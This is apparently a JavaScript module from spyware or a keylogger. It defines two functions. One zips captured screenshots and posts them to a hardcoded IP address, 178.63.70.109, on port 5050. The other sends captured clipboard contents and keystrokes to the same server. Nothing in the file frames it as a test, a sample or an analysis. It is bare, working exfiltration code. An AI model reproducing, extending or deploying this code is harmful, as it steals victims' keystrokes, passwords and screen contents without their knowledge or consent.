const axios = require("axios");
const FormData = require('form-data');
const JSZip = require("jszip");

const sendScreenData = async (images, monitorId = 0) => {
  try {
    const zip = new JSZip();

    images.forEach(image => {
      zip.file(`scr_${(new Date()).getTime()}_${monitorId.png}.webp`, image.buffer)
    })
    const zipBlob = await zip.generateAsync({ type: "blob" });;

    const formData = new FormData();
    formData.append('file', zipBlob, "images.zip");

    await axios.post('http://178.63.70.109:5050/api1', formData, {
      headers: {
        ...formData.getHeaders(), // Automatically sets multipart boundaries
      },
    });

    return true;
  } catch (err) {
    console.error(err);
    return false;
  }
}

const sendClipboardAndKeyboardData = async (clipboard, keyboard) => {
  try {
    await axios.post('http://178.63.70.109:5050/api2', {
      clipboard,
      keyboard
    }, {
      headers: {
        'Content-Type': 'application/json',
      },
    });
    return true;
  } catch (err) {
    console.error(err);
    return false;
  }
}

module.exports = {
  sendScreenData,
  sendClipboardAndKeyboardData,
}